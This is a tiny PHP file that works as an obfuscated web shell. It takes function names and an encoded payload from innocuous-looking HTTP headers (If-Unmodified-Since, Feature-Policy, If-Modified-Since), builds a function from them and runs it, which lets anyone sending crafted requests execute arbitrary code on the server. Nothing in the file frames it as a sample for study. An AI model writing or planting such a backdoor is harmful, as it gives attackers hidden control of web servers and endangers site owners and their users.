<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $requests = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Modified-Since']));
    $requests();
}